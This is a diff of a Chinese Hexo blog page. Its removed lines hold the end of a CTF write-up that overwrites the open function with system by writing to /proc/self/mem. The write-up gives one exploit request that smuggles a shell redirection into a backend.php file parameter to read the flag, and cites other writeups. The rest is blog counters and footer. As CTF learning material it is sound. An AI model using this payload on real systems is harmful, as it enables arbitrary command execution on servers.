-<h3 id="修改进程内存"><a href="#修改进程内存" class="headerlink" title="修改进程内存"></a>修改进程内存</h3><blockquote>
-<p>/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</p>
-</blockquote>
-<ul>
-<li><p>也就是说我们刚才从maps和动态链接库计算出system的地址需要修改mem来使得open的地址变成system的地址。既然我们偏移地址和文件偏移都算出来了直接构造payload即可。</p>
-<pre><code>backend.php?readfile=/readflag&gt;/tmp/i_o_u_hlq&amp;writefile=/proc/self/mem&amp;buffer=%90%65%f8%f5%ff%7f&amp;offset=15333784</code></pre></li>
-<li><p>直接读取<code>/tmp/i_o_u_hlq</code>就可以直接<code>getflag</code></p>
-</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG2879.png" alt="WechatIMG2879"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
-<li><p>Nu1L 西湖论剑wp</p>
-</li>
-<li><p><a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">https://blog.spoock.com/2019/10/08/proc/</a></p>
-</li>
-<li><p><a href="https://www.pianshen.com/article/4537767804/" target="_blank" rel="noopener">https://www.pianshen.com/article/4537767804/</a></p>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2645,7 +2516,7 @@ echo $open_php;
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-count">73</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2716,12 +2587,12 @@ echo $open_php;
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">263k</span>
+    <span title="站点总字数">267k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:59</span>
+    <span title="站点阅读时长">4:02</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
